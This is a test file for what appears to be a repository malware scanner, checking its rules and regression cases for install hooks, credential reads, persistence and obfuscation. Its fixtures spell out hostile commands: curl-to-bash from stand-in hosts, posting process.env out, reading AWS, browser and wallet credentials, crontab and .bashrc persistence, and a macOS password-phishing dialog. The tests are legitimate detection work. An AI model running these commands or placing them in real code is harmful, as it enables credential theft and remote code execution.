import "./helpers.js";
import test from "node:test";
import assert from "node:assert/strict";
import { checkFile, checkRepoMeta } from "../src/heuristics.js";
import { referencedScriptPaths } from "../src/packagejson.js";
import { selectableFiles } from "../src/selection.js";
import { isVendoredArtifact } from "../src/vendored.js";

// scan.js takes selectableFiles(tree).slice(0, MAX_FILES_FETCHED); these
// tests are about the priority order, so they cap explicitly and small.
const selectFilesToFetch = (tree, maxFiles) => selectableFiles(tree).slice(0, maxFiles);
import { defaultMeta, FIXED_NOW } from "./helpers.js";

function fileOf(path, content) {
  return { path, content, bytes: content.length, lines: content.split("\n").length };
}

function pkg(json) {
  return fileOf("package.json", JSON.stringify(json, null, 2));
}

// package.json

test("REGRESSION: an inlined media asset is not a smuggled payload", async () => {
  // taiga-family/ng-web-apis came out red for a demo that inlines an Ogg
  // because Stackblitz cannot serve audio assets, decodes it with atob and
  // hands it to decodeAudioData. That is this rule's exact shape and is also
  // what every playground demo does.
  const b64 = (bytes) => Buffer.concat([Buffer.from(bytes), Buffer.alloc(700, 0x41)]).toString("base64");
  const withDecode = (blob) => `const R = '${blob}';\nconst b = window.atob(R);\nplay(b);\n`;

  const ogg = checkFile({ path: "demo/response.ts", content: withDecode(b64([0x4f, 0x67, 0x67, 0x53])) }, {});
  const oggBlob = ogg.find((f) => f.id === "base64-blob");
  assert.equal(oggBlob.severity, "medium", "an identified asset must not be a high on its own");
  assert.match(oggBlob.why, /media or font file/);

  const png = checkFile({ path: "demo/logo.ts", content: withDecode(b64([0x89, 0x50, 0x4e, 0x47])) }, {});
  assert.equal(png.find((f) => f.id === "base64-blob").severity, "medium");

  // Anything that decodes to something runnable keeps its full weight: an
  // archive of code, WebAssembly, and a blob that is simply source.
  for (const bytes of [[0x50, 0x4b, 0x03, 0x04], [0x1f, 0x8b, 0x08, 0x00], [0x00, 0x61, 0x73, 0x6d]]) {
    const out = checkFile({ path: "src/loader.js", content: withDecode(b64(bytes)) }, {});
    assert.equal(out.find((f) => f.id === "base64-blob").severity, "high", `${bytes} must stay high`);
  }

  // Without a decode call an asset is only worth reporting, not cautioning.
  const quiet = checkFile({ path: "demo/sound.ts", content: `const R = '${b64([0x4f, 0x67, 0x67, 0x53])}';\n` }, {});
  assert.equal(quiet.find((f) => f.id === "base64-blob").severity, "low");
});

test("REGRESSION: an Emscripten build is a build artifact", () => {
  // galacean/engine ships PhysX compiled to asm.js under libs/. The body
  // reads as one huge encoded blob because that is what a C++ library
  // compiled to JavaScript looks like, and Emscripten stamps its own section
  // markers into it.
  assert.equal(isVendoredArtifact("packages/physics-physx/libs/physx.js", "// EMSCRIPTEN_START_ASM\nfunction instantiate(){}"), true);
  assert.equal(isVendoredArtifact("src/app.js", "const a = 1;\n"), false);
});

test("REGRESSION: removing a crontab is the opposite of installing one", () => {
  // `crontab -` installs from stdin and is the persistence shape; -r removes
  // every entry and -l prints them. LumePart/Explo turned red for the line
  // "crontab -r  # Clear crontabs" in a container entrypoint.
  const sev = (c) => checkFile({ path: "start.sh", content: c }, {}).find((f) => f.id === "startup-persistence")?.severity;
  assert.equal(sev("# Clear crontabs\ncrontab -r\n"), undefined);
  assert.equal(sev("crontab -l > /tmp/backup\n"), undefined);

  // The forms that actually install one still convict.
  assert.equal(sev('echo "* * * * * /tmp/p.sh" | crontab -\n'), "high");
  assert.equal(sev("crontab -e\n"), "high");
  assert.equal(sev("crontab -u root /tmp/evil.cron\n"), "high");
});

test("REGRESSION: a docs tree is served content like any other", () => {
  // formkit/auto-animate turned red for the minified Prism.js in docs/assets/,
  // whose shell-keyword list names curl and wget. The same highlighter is
  // already noted for Chainlink, but that rule wants a content hash in the
  // filename and this copy has none.
  assert.equal(isVendoredArtifact("docs/assets/prism.js", ""), true);
  assert.equal(isVendoredArtifact("docs/js/highlight.js", ""), true);
  // Authored code under the docs tree, and names that merely contain the word.
  assert.equal(isVendoredArtifact("docs/src/example.js", ""), false);
  assert.equal(isVendoredArtifact("src/docs.js", ""), false);
});

test("REGRESSION: external-libs is a vendor directory like any other", () => {
  // helixml/helix ships Redoc at frontend/assets/external-libs/redoc/.
  assert.equal(isVendoredArtifact("frontend/assets/external-libs/redoc/redoc.standalone.js", ""), true);
  assert.equal(isVendoredArtifact("external/zlib/zlib.c", ""), true);
  assert.equal(isVendoredArtifact("third-party/lib.js", ""), true);
  // A file merely named for the word is authored code.
  assert.equal(isVendoredArtifact("src/externalApi.js", ""), false);
  assert.equal(isVendoredArtifact("src/external.js", ""), false);
});

test("REGRESSION: a build tool's own banner marks its output, line length does not", () => {
  // FalconChristmas/fpp turned red for a 3.7 MB seven-line bundle under
  // www/js/. The obvious fix, treating a very long line as minified, is
  // wrong: the single-line-blob fixture is one 14 KB line and is malicious.
  // A minifier stamps what it made; an attacker's payload does not.
  const banner = [
    "/**", " * Minified by jsDelivr using Terser v5.39.0.",
    " * Original file: /npm/@scalar/api-reference@1.55.3/dist/browser/standalone.js",
    " */", "!function(){", "}();",
  ].join("\n");
  assert.equal(isVendoredArtifact("www/js/scalar.js", banner), true);
  assert.equal(isVendoredArtifact("assets/x.js", "// generated by esbuild\nvar a=1;"), true);

  // One enormous line is not by itself evidence of anything.
  assert.equal(isVendoredArtifact("app.js", `eval(atob("${"A".repeat(14000)}"))`), false);
  // www is a web root like public and static; www/src is the project's own.
  assert.equal(isVendoredArtifact("www/js/lib.js", "var a=1;"), true);
  assert.equal(isVendoredArtifact("www/src/app.js", "var a=1;"), false);
});

test("REGRESSION: vendored libraries named the other way round are still vendored", () => {
  // A minifier separates its suffix with a hyphen as often as a dot, and
  // under a served-assets directory lib/ is where third-party code is
  // dropped while src/ is the project's own. pi-hole/FTL and
  // yona-projects/yona turned red for a bundled docs viewer and the Ace
  // editor respectively.
  assert.equal(isVendoredArtifact("src/api/docs/content/external/rapidoc-min.js", ""), true);
  assert.equal(isVendoredArtifact("resources/static/javascripts/lib/ace/worker-xquery.js", ""), true);
  assert.equal(isVendoredArtifact("public/js/vendor/jquery.js", ""), true);

  // The project's own code served statically is still the project's own code,
  // at the top of the assets directory and below it.
  assert.equal(isVendoredArtifact("public/src/main.js", ""), false);
  assert.equal(isVendoredArtifact("static/js/src/app.js", ""), false);
  // And a name that merely contains the word is not a build artifact.
  assert.equal(isVendoredArtifact("src/admin-minimal.js", ""), false);
  assert.equal(isVendoredArtifact("src/lib/utils.js", ""), false);
});

test("REGRESSION: Rust's inline test module is test code, not production code", () => {
  // Rust keeps unit tests in the same file under #[cfg(test)], so no path
  // rule can see them. yologdev/yoyo-evolve blocks dangerous shell commands
  // for a living and turned red because its tests assert that it catches
  // writing to ~/.ssh/authorized_keys.
  const tests = [
    "// a safety analyser\n".repeat(15),
    "#[cfg(test)]\nmod tests {\n    #[test]\n    fn catches_it() {\n",
    '        assert!(analyze("echo k >> ~/.ssh/authorized_keys").is_some());\n    }\n}\n',
  ].join("");
  const inTests = checkFile({ path: "src/safety.rs", content: tests }, {});
  const found = inTests.find((f) => f.id === "ssh-backdoor");
  assert.ok(found, "the signature must still be reported, just not as danger");
  assert.equal(found.severity, "medium");
  assert.match(found.why, /#\[cfg\(test\)\] module/);

  // The same line above the attribute is production code and keeps its weight.
  const prod = `fn setup() {\n    write("~/.ssh/authorized_keys", key);\n}\n${tests}`;
  const inProd = checkFile({ path: "src/setup.rs", content: prod }, {});
  assert.equal(inProd.find((f) => f.id === "ssh-backdoor")?.severity, "high");

  // A file with no test module is untouched.
  const plain = checkFile(
    { path: "src/x.rs", content: 'fn f() { std::process::Command::new("sh").arg("-c").arg("curl http://a/b | sh").status(); }\n' },
    {},
  );
  assert.equal(plain.find((f) => f.id === "download-and-execute")?.severity, "high");
});

test("REGRESSION: a modern bundler's hashed output counts as vendored", () => {
  // Vite and Rollup name their output with a base62 content hash, so the
  // hex-only rule missed every one of them. jtydhr88/ComfyTV came out red
  // for an invisible character inside a Vite bundle.
  assert.equal(isVendoredArtifact("js/assets/main-C27Rsro-.mjs", ""), true);
  assert.equal(isVendoredArtifact("assets/index-a1B2c3D4.css", ""), true);
  // A hand-written file that happens to live under assets/ is still authored.
  assert.equal(isVendoredArtifact("src/assets/logo-helper.js", ""), false);
  assert.equal(isVendoredArtifact("src/my-utility-helper.js", ""), false);
});

test("a postinstall that pipes curl into a shell fires high", () => {
  const findings = checkFile(pkg({ name: "x", scripts: { postinstall: "curl -s http://x.example/i | bash" } }));
  const f = findings.find((x) => x.id === "lifecycle-script");
  assert.equal(f.severity, "high");
  assert.equal(typeof f.line, "number");
});

test("a benign local prepare fires low, and mentions git installs", () => {
  const findings = checkFile(pkg({ name: "x", scripts: { prepare: "node scripts/setup.js" } }));
  const f = findings.find((x) => x.id === "lifecycle-script");
  assert.equal(f.severity, "low");
  assert.ok(f.why.includes("git source"));
});

test("a dangerous non-lifecycle script fires medium", () => {
  const findings = checkFile(pkg({ name: "x", scripts: { start: "node -e \"require('http')\" && node server.js" } }));
  assert.ok(findings.some((f) => f.id === "dangerous-npm-script" && f.severity === "medium"));
});

test("plain build and test scripts fire nothing", () => {
  const findings = checkFile(
    pkg({ name: "x", scripts: { build: "vite build", test: "node --test", start: "node server.js" } }),
  );
  assert.deepEqual(findings, []);
});

test("a git or URL dependency in package.json fires medium", () => {
  const findings = checkFile(pkg({ name: "x", dependencies: { helper: "github:someone/helper" } }));
  assert.ok(findings.some((f) => f.id === "manifest-non-registry-dependency"));
});

test("overrides redirecting a package to a URL fire medium; version overrides do not", () => {
  const url = checkFile(pkg({ name: "x", overrides: { lodash: "https://evil.example/lodash.tgz" } }));
  assert.ok(url.some((f) => f.id === "override-redirect"));

  const version = checkFile(pkg({ name: "x", overrides: { lodash: "4.17.21", nested: { minimist: "1.2.8" } } }));
  assert.deepEqual(version, []);
});

test("gypfile true fires medium", () => {
  const findings = checkFile(pkg({ name: "x", gypfile: true }));
  assert.ok(findings.some((f) => f.id === "native-build-at-install"));
});

test("a bin entry shadowing a system command fires high", () => {
  const findings = checkFile(pkg({ name: "x", bin: { npm: "./lib/hijack.js" } }));
  const f = findings.find((x) => x.id === "bin-command-shadowing");
  assert.equal(f.severity, "high");
});

test("a normal bin entry does not fire", () => {
  assert.deepEqual(checkFile(pkg({ name: "widget-cli", bin: { "widget-cli": "./cli.js" } })), []);
});

test("broken package.json fires low, never crashes", () => {
  const findings = checkFile(fileOf("package.json", "{ nope"));
  assert.equal(findings[0].id, "broken-package-json");
});

// code content

test("download-and-execute fires when the fetch and the exec sit together", () => {
  const content = [
    'const res = await fetch("https://drop.example.invalid/p");',
    "const body = await res.text();",
    'require("child_process").execSync(body);',
  ].join("\n");
  const findings = checkFile(fileOf("install.js", content));
  assert.ok(findings.some((f) => f.id === "download-and-execute"));
});

test("download-and-execute does not fire when they are far apart", () => {
  const filler = Array.from({ length: 40 }, (_, i) => `const value${i} = ${i} * 2;`).join("\n");
  const content = [
    'const docs = "https://example.invalid/guide";',
    filler,
    'require("child_process").execSync("./node_modules/.bin/build");',
  ].join("\n");
  const findings = checkFile(fileOf("build.js", content));
  assert.ok(!findings.some((f) => f.id === "download-and-execute"));
});

test("download-and-execute does not fire on a local exec with no URL", () => {
  const content = 'const { execSync } = require("child_process");\nexecSync("node ./scripts/build.js");\n';
  const findings = checkFile(fileOf("build.js", content));
  assert.ok(!findings.some((f) => f.id === "download-and-execute"));
});

test("reading env and posting out together fires env-exfiltration", () => {
  const content = 'const axios = require("axios");\naxios.post("https://c.example/x", { e: process.env });\n';
  const findings = checkFile(fileOf("index.js", content));
  assert.ok(findings.some((f) => f.id === "env-exfiltration" && f.severity === "high"));
});

test("reading env without sending anything does not fire env-exfiltration", () => {
  const content = "const port = process.env.PORT || 3000;\nconsole.log(port);\n";
  const findings = checkFile(fileOf("index.js", content));
  assert.ok(!findings.some((f) => f.id === "env-exfiltration"));
});

test("reading named service credentials to connect to that service does not fire env-exfiltration", () => {
  // The Upstash / Vercel KV rate-limit pattern: named env vars are the
  // connection URL and auth token, and the request goes to that service.
  const content =
    "const url = process.env.KV_REST_API_URL ?? process.env.UPSTASH_REDIS_REST_URL;\n" +
    "const token = process.env.KV_REST_API_TOKEN ?? process.env.UPSTASH_REDIS_REST_TOKEN;\n" +
    'export async function limit(ip) {\n' +
    '  return fetch(url, { method: "POST", headers: { Authorization: `Bearer ${token}` }, body: JSON.stringify(["INCR", ip]) });\n' +
    "}\n";
  const findings = checkFile(fileOf("lib/rate-limit.ts", content));
  assert.ok(!findings.some((f) => f.id === "env-exfiltration"), "named-credential connection must not be flagged as exfiltration");
});

test("reaching for browser credential stores fires high", () => {
  const content = 'const p = path.join(home, "AppData/Local/Google/Chrome/User Data/Default/Login Data");\n';
  const findings = checkFile(fileOf("collect.js", content));
  assert.ok(findings.some((f) => f.id === "wallet-file-access" && f.severity === "high"));
});

test("a hardcoded wallet extension ID fires high", () => {
  const content = 'const target = "nkbihfbeogaeaoehlefnkodbefgpgknn";\n';
  const findings = checkFile(fileOf("scan.js", content));
  const f = findings.find((x) => x.id === "wallet-extension-id");
  assert.ok(f.why.includes("MetaMask"));
});

test("eval and obfuscation markers are downgraded inside vendored bundles", () => {
  const content = `/*! @license MIT (c) 2020 SomeLib */ var _0xab12=["a"];eval(_0xab12[0]);${"x".repeat(9000)}`;
  const findings = checkFile(fileOf("dist/lib.min.js", content));
  assert.ok(findings.length > 0);
  for (const f of findings) assert.equal(f.severity, "low", f.id);
});

test("the same markers in hand-authored config stay high and add payload-in-config", () => {
  const content = 'var _0xab12 = ["h"];\neval(_0xab12[0]);\nmodule.exports = {};\n';
  const findings = checkFile(fileOf("postcss.config.js", content));
  assert.ok(findings.some((f) => f.id === "hex-obfuscation" && f.severity === "high"));
  assert.ok(findings.some((f) => f.id === "payload-in-config"));
});

test("ordinary application code fires nothing", () => {
  const content = [
    "import express from 'express';",
    "const app = express();",
    "app.get('/', (req, res) => res.send('ok'));",
    "app.listen(process.env.PORT || 3000);",
  ].join("\n");
  assert.deepEqual(checkFile(fileOf("server.js", content)), []);
});

// context signals

test("INVARIANT: context signals alone can never make a red verdict", () => {
  // The worst possible context: new account, no repos, empty org, fork,
  // burst history, mismatched authors, crypto lure theme.
  const worst = defaultMeta({
    ownerCreatedAt: "2025-12-20T00:00:00Z",
    ownerPublicRepos: 0,
    ownerType: "Organization",
    orgPublicMembers: 0,
    isFork: true,
    description: "crypto trading bot for defi exchange",
    commitAuthorNames: ["Somebody Else"],
    commitDates: Array.from({ length: 15 }, (_, i) => `2025-12-28T0${i % 9}:00:00Z`),
  });
  const findings = checkRepoMeta(worst, FIXED_NOW);
  assert.ok(findings.length >= 5);
  for (const f of findings) {
    assert.notEqual(f.severity, "high", `${f.id} must never be high`);
  }
});

test("an established account with matching authors fires no context signals", () => {
  assert.deepEqual(checkRepoMeta(defaultMeta(), FIXED_NOW), []);
});

test("fork and commit-burst context signals fire as low", () => {
  const meta = defaultMeta({
    isFork: true,
    commitDates: Array.from({ length: 12 }, (_, i) => `2025-12-28T0${i % 9}:15:00Z`),
  });
  const findings = checkRepoMeta(meta, FIXED_NOW);
  assert.ok(findings.some((f) => f.id === "repo-is-fork" && f.severity === "low"));
  assert.ok(findings.some((f) => f.id === "commit-burst" && f.severity === "low"));
});

// selection and follow-ups

test("selectFilesToFetch prioritizes manifests, lockfiles, and autorun files", () => {
  const tree = [
    { path: "src/a.js", size: 100 },
    { path: "package.json", size: 300 },
    { path: "package-lock.json", size: 5000 },
    { path: ".vscode/tasks.json", size: 200 },
    { path: ".github/workflows/ci.yml", size: 400 },
    { path: "pyproject.toml", size: 150 },
    { path: "README.md", size: 800 },
    { path: "node_modules/x/package.json", size: 100 },
  ];
  const picks = selectFilesToFetch(tree, 40);
  assert.ok(picks.includes("package.json"));
  assert.ok(picks.includes("package-lock.json"));
  assert.ok(picks.includes(".vscode/tasks.json"));
  assert.ok(picks.includes(".github/workflows/ci.yml"));
  assert.ok(picks.includes("pyproject.toml"));
  assert.ok(picks.includes("README.md"));
  assert.ok(!picks.includes("node_modules/x/package.json"));
  assert.equal(picks[0], "package.json");
});

test("selectFilesToFetch reaches source directories, not just the root", () => {
  const tree = [
    { path: "package.json", size: 300 },
    { path: "README.md", size: 800 },
    { path: "src/utils/format.js", size: 400 },
    { path: "lib/client.js", size: 400 },
    { path: "app/routes/index.js", size: 400 },
    { path: "test/unit/format.test.js", size: 400 },
    { path: "dist/vendor.min.js", size: 900 },
  ];
  const picks = selectFilesToFetch(tree, 40);
  for (const path of ["src/utils/format.js", "lib/client.js", "app/routes/index.js"]) {
    assert.ok(picks.includes(path), path);
  }
  const source = picks.indexOf("src/utils/format.js");
  assert.ok(source < picks.indexOf("test/unit/format.test.js"));
  assert.ok(source < picks.indexOf("dist/vendor.min.js"));
});

test("a large minified bundle is fetched before ordinary source, as a blob candidate", () => {
  const tree = [
    { path: "package.json", size: 300 },
    { path: "src/index.js", size: 400 },
    { path: "dist/vendor.min.js", size: 90_000 },
  ];
  const picks = selectFilesToFetch(tree, 40);
  assert.ok(picks.indexOf("dist/vendor.min.js") < picks.indexOf("src/index.js"));
});

test("selectFilesToFetch takes shallower source files first", () => {
  const tree = [
    { path: "package.json", size: 300 },
    { path: "a/b/c/d/deep.js", size: 400 },
    { path: "shallow.js", size: 400 },
    { path: "a/mid.js", size: 400 },
  ];
  const picks = selectFilesToFetch(tree, 40);
  assert.ok(picks.indexOf("shallow.js") < picks.indexOf("a/mid.js"));
  assert.ok(picks.indexOf("a/mid.js") < picks.indexOf("a/b/c/d/deep.js"));
});

/** A category quota may reorder a file, never remove it. */
const QUOTA_OVERFLOW = [
  { name: "package.json files", make: (i) => `pkg${i}/package.json`, quota: 4 },
  { name: "auto-run files", make: (i) => `dir${i}/.envrc`, quota: 4 },
  { name: "workflows", make: (i) => `.github/workflows/w${i}.yml`, quota: 5 },
];

for (const { name, make, quota } of QUOTA_OVERFLOW) {
  test(`selectFilesToFetch keeps ${name} past the category quota of ${quota}`, () => {
    const paths = Array.from({ length: quota + 3 }, (_, i) => make(i));
    const picks = selectFilesToFetch(
      paths.map((path) => ({ path, size: 200 })),
      40,
    );
    for (const path of paths) assert.ok(picks.includes(path), path);
  });
}

test("INVARIANT: file selection always respects the cap", () => {
  const tree = Array.from({ length: 500 }, (_, i) => ({ path: `f${i}.js`, size: 20_000 }));
  assert.ok(selectFilesToFetch(tree, 40).length <= 40);
});

test("referencedScriptPaths finds lifecycle script files and bin targets", () => {
  const content = JSON.stringify({
    scripts: { postinstall: "node scripts/setup.js && echo done", test: "node --test" },
    bin: { widget: "./bin/widget.js" },
  });
  const paths = referencedScriptPaths(content);
  assert.ok(paths.includes("scripts/setup.js"));
  assert.ok(paths.includes("bin/widget.js"));
  assert.ok(!paths.some((p) => p.includes("--test")));
});

test("a long npm run chain neither overflows the stack nor hides its end", () => {
  const scripts = { postinstall: "npm run s0" };
  for (let i = 0; i < 2000; i++) scripts[`s${i}`] = `npm run s${i + 1}`;
  scripts.s2000 = "node payload/drop.js";
  const content = JSON.stringify({ name: "x", scripts });
  assert.deepEqual(referencedScriptPaths(content), ["payload/drop.js"]);
  assert.doesNotThrow(() => checkFile(pkg({ name: "x", scripts })));
});

test("npm alias redirecting a bare popular name fires high", () => {
  const findings = checkFile(pkg({ name: "x", dependencies: { react: "npm:react-dom-helper-x@1.0.0" } }));
  assert.ok(findings.some((f) => f.id === "npm-alias-mismatch" && f.severity === "high"));
});

test("a descriptive alias of the same package does not fire", () => {
  // react-builtin -> react and zod3 -> zod are legitimate version aliases.
  const a = checkFile(pkg({ name: "x", dependencies: { "react-builtin": "npm:react@19", zod3: "npm:zod@3" } }));
  assert.ok(!a.some((f) => f.id === "npm-alias-mismatch"));
});

test("a surveillance dependency fires medium", () => {
  const findings = checkFile(pkg({ name: "x", dependencies: { "node-global-key-listener": "^0.3.0" } }));
  assert.ok(findings.some((f) => f.id === "surveillance-dependency" && f.severity === "medium"));
});

test("reading a cloud credential file fires high", () => {
  const content = 'const fs = require("fs");\nfs.readFileSync(process.env.HOME + "/.aws/credentials");\n';
  const findings = checkFile(fileOf("grab.js", content));
  assert.ok(findings.some((f) => f.id === "wallet-file-access" && f.severity === "high"));
});

test("appending a launch command to a startup file fires high; help text does not", () => {
  const persist = 'const fs = require("fs");\nfs.appendFileSync(home + "/.bashrc", "\\nnode ~/.cache/agent.js &\\n");\n';
  assert.ok(checkFile(fileOf("install.js", persist)).some((f) => f.id === "startup-persistence"));
  // A shell-completion instruction that only edits .zshrc is not persistence.
  const help = 'const usage = `echo "autoload -U compinit; compinit" >> ~/.zshrc`;\nmodule.exports = usage;\n';
  assert.ok(!checkFile(fileOf("completions.js", help)).some((f) => f.id === "startup-persistence"));
});

test("a PowerShell encoded command fires high", () => {
  const content =
    'const { execSync } = require("child_process");\nexecSync("powershell -NoProfile -enc SQBFAFgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACkA");\n';
  assert.ok(checkFile(fileOf("run.js", content)).some((f) => f.id === "powershell-encoded-command" && f.severity === "high"));
});

test("decode-base64 piped to Invoke-Expression fires high", () => {
  const content = 'iex ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p)))\n';
  assert.ok(checkFile(fileOf("payload.ps1", content)).some((f) => f.id === "powershell-encoded-command"));
});

test("a Windows LOLBin download via certutil fires high", () => {
  const content = 'execSync("certutil -urlcache -split -f http://x.example.invalid/a.exe a.exe");\n';
  assert.ok(checkFile(fileOf("fetch.js", content)).some((f) => f.id === "windows-lolbin-download" && f.severity === "high"));
});

test("an ordinary certutil hash check does not fire the LOLBin rule", () => {
  const content = 'execSync("certutil -hashfile installer.msi SHA256");\n';
  assert.ok(!checkFile(fileOf("verify.js", content)).some((f) => f.id === "windows-lolbin-download"));
});

test("a macOS AppleScript password dialog fires high in either order", () => {
  const after = "const s = 'display dialog \"Enter password\" default answer \"\" with hidden answer';\nexecSync('osascript -e ' + s);\n";
  assert.ok(checkFile(fileOf("prompt.js", after)).some((f) => f.id === "macos-password-phish" && f.severity === "high"));
  const before = "osascript -e 'display dialog \"Password\" with hidden answer'\n";
  assert.ok(checkFile(fileOf("p.sh", before)).some((f) => f.id === "macos-password-phish"));
});

test("a plain osascript notification does not fire the password-phish rule", () => {
  const content = "execSync(\"osascript -e 'display notification \\\"done\\\"'\");\n";
  assert.ok(!checkFile(fileOf("notify.js", content)).some((f) => f.id === "macos-password-phish"));
});

test("uploading to an anonymous file host fires exfil-sink", () => {
  const content = 'fetch("https://0x0.st", { method: "POST", body: data });\n';
  assert.ok(checkFile(fileOf("send.js", content)).some((f) => f.id === "exfil-sink"));
});

test("a silent remote-desktop install fires high; merely naming the tool does not", () => {
  const bad = 'execSync("anydesk --install /opt/anydesk --silent --start-with-win");\n';
  assert.ok(checkFile(fileOf("install.js", bad)).some((f) => f.id === "remote-desktop-rat" && f.severity === "high"));
  const mention = 'const doc = "You can also connect with TeamViewer or AnyDesk if you prefer.";\n';
  assert.ok(!checkFile(fileOf("readme-note.js", mention)).some((f) => f.id === "remote-desktop-rat"));
});

test("a Jupyter notebook code cell that downloads and runs a payload fires high", () => {
  const nb = JSON.stringify({
    cells: [
      { cell_type: "markdown", source: ["# Task\n"] },
      { cell_type: "code", source: ["import requests\n", "exec(requests.get('http://x.example.invalid/p').text)\n"] },
    ],
    metadata: { kernelspec: { language: "python" } },
  });
  const findings = checkFile(fileOf("task.ipynb", nb));
  assert.ok(findings.some((f) => f.id === "python-download-execute" && f.severity === "high"));
});

test("a benign notebook and a malformed notebook do not crash or fire", () => {
  const clean = JSON.stringify({
    cells: [{ cell_type: "code", source: ["import pandas as pd\n", "df = pd.read_csv('data.csv')\n"] }],
    metadata: { kernelspec: { language: "python" } },
  });
  assert.deepEqual(checkFile(fileOf("clean.ipynb", clean)), []);
  assert.deepEqual(checkFile(fileOf("broken.ipynb", "{ not json")), []);
});

/**
 * checkFile routes a path to its checker by name and extension. The checkers
 * have their own tests; this pins the wiring, which nothing else exercises.
 */
const ROUTED_FILES = [
  { path: "Dockerfile", content: "FROM node:20\nRUN curl -fsSL https://evil.example.invalid/i.sh | bash\n", id: "dockerfile-remote-exec" },
  { path: "build.dockerfile", content: "FROM node:20\nRUN curl -fsSL https://evil.example.invalid/i.sh | bash\n", id: "dockerfile-remote-exec" },
  { path: ".npmrc", content: "//registry.example.invalid/:_authToken=npm_secretvalue\n", id: "npmrc-committed-token" },
  { path: ".pnpmfile.cjs", content: 'const cp = require("child_process");\nmodule.exports = { hooks: { readPackage(p){ cp.execSync("curl http://x.example.invalid | bash"); return p; } } };\n', id: "pnpm-install-hook" },
  { path: "composer.json", content: JSON.stringify({ scripts: { "post-install-cmd": "curl -s http://x.example.invalid/i.sh | bash" } }), id: "composer-install-script" },
  { path: ".yarnrc.yml", content: 'yarnPath: "./tools/yarn-shim.cjs"\n', id: "yarnrc-yarnpath" },
  { path: ".vscode/settings.json", content: JSON.stringify({ "eslint.nodePath": "./.bin/evil.js" }), id: "vscode-tool-path-hijack" },
  { path: ".envrc", content: "curl -fsSL https://evil.example.invalid/x | bash\n", id: "direnv-envrc" },
  { path: "docker-compose.yml", content: "services:\n  app:\n    command: sh -c \"curl -fsSL https://evil.example.invalid/x | bash\"\n", id: "compose-remote-exec" },
  { path: "Makefile", content: "all:\n\tcurl -fsSL https://evil.example.invalid/x | bash\n", id: "makefile-remote-exec" },
  { path: ".devcontainer/devcontainer.json", content: JSON.stringify({ postCreateCommand: "curl -fsSL https://evil.example.invalid/x | bash" }), id: "devcontainer-dangerous-hook" },
  { path: "setup.py", content: "import os\nos.system('curl http://x.example.invalid | sh')\n", id: "setup-py-install-exec" },
  { path: "build.rs", content: 'fn main() { reqwest::get("https://evil.example.invalid/x"); }\n', id: "build-rs-network-exec" },
  { path: "package-lock.json", content: JSON.stringify({ lockfileVersion: 3, packages: { "node_modules/x": { resolved: "https://cdn.evil.example.invalid/x.tgz" } } }), id: "lockfile-off-registry" },
  { path: "yarn.lock", content: '"x@^1.0.0":\n  version "1.0.0"\n  resolved "https://cdn.evil.example.invalid/x.tgz"\n', id: "lockfile-off-registry" },
  { path: ".github/workflows/ci.yml", content: "on: pull_request_target\njobs:\n  a:\n    runs-on: self-hosted\n", id: "workflow-self-hosted-runner" },
];

for (const { path, content, id } of ROUTED_FILES) {
  test(`checkFile routes ${path} to the checker that fires ${id}`, () => {
    const findings = checkFile({ path, content, bytes: content.length, lines: content.split("\n").length });
    assert.ok(
      findings.some((f) => f.id === id),
      `${path}: got ${findings.map((f) => f.id).join(",") || "no findings"}`,
    );
  });
}

/**
 * Findings under a path that does not run on install or open are downgraded,
 * never dropped. Widening TEST_PATH would quietly turn a red into a yellow.
 */
const TEST_PATHS = [
  "test/a.js",
  "tests/a.js",
  "__tests__/a.js",
  "spec/a.js",
  "examples/a.js",
  "src/a.test.js",
  "src/a.spec.js",
];

const WALLET_READ = 'const fs = require("fs");\nfs.readFileSync(process.env.HOME + "/.electrum/wallets/default_wallet");\n';

test("a high finding in real source stays high", () => {
  const findings = checkFile({ path: "src/a.js", content: WALLET_READ, bytes: WALLET_READ.length, lines: 2 });
  const hit = findings.find((f) => f.id === "wallet-file-access");
  assert.equal(hit?.severity, "high");
});

for (const path of TEST_PATHS) {
  test(`a high finding under ${path} is downgraded, not dropped`, () => {
    const findings = checkFile({ path, content: WALLET_READ, bytes: WALLET_READ.length, lines: 2 });
    const hit = findings.find((f) => f.id === "wallet-file-access");
    assert.ok(hit, "the finding must still be reported");
    assert.equal(hit.severity, "medium");
  });
}

for (const path of ["src/latest/a.js", "contest/a.js", "src/protest.js", "src/attestation.js"]) {
  test(`${path} is not mistaken for a test path`, () => {
    const findings = checkFile({ path, content: WALLET_READ, bytes: WALLET_READ.length, lines: 2 });
    assert.equal(findings.find((f) => f.id === "wallet-file-access")?.severity, "high");
  });
}

test("a shell script handing a download to bash by process substitution fires high", () => {
  const content = "#!/bin/sh\necho setup\nbash <(curl -s http://drop.example.invalid/env.sh)\n";
  const findings = checkFile({ path: "scripts/setup.sh", content, bytes: content.length, lines: 3 });
  const hit = findings.find((f) => f.id === "download-and-execute");
  assert.equal(hit?.severity, "high");
  assert.equal(hit.line, 3);
});

test("a shell script saving a download and running it later fires high", () => {
  const content = "curl -s http://drop.example.invalid/p.sh -o /tmp/p.sh\nchmod 600 /tmp/x\nsh /tmp/p.sh\n";
  const findings = checkFile({ path: "install.sh", content, bytes: content.length, lines: 3 });
  assert.equal(findings.find((f) => f.id === "download-and-execute")?.severity, "high");
});

test("a shell script bootstrapping a known installer is not download-and-execute", () => {
  // The same allowlist that clears a Dockerfile clears a CI script.
  const content = "set -e\ncurl --proto '=https' -sSf https://sh.rustup.rs | sh -s -- -y\nnpm ci\n";
  const findings = checkFile({ path: "ci/setup.sh", content, bytes: content.length, lines: 3 });
  assert.ok(!findings.some((f) => f.id === "download-and-execute"), JSON.stringify(findings));
});

test("a checksum piped from a download is not download-and-execute", () => {
  const content = "curl -sL https://example.com/f.tgz | sha256sum -c -\n";
  const findings = checkFile({ path: "verify.sh", content, bytes: content.length, lines: 1 });
  assert.ok(!findings.some((f) => f.id === "download-and-execute"));
});

test("a trivial inline node -e gate in a lifecycle hook is low, a payload-shaped one stays high", () => {
  const gate = checkFile(
    pkg({ name: "x", scripts: { postinstall: 'node -e "process.exit(process.env.CI ? 0 : 1)" || yarn build' } }),
  ).find((f) => f.id === "lifecycle-script");
  assert.equal(gate.severity, "low");
  const payload = checkFile(
    pkg({ name: "x", scripts: { preinstall: "node -e \"eval(Buffer.from('ZmV0Y2go','base64').toString())\"" } }),
  ).find((f) => f.id === "lifecycle-script");
  assert.equal(payload.severity, "high");
  const fetcher = checkFile(
    pkg({ name: "x", scripts: { postinstall: "node -e \"require('http').get('http://x.example')\"" } }),
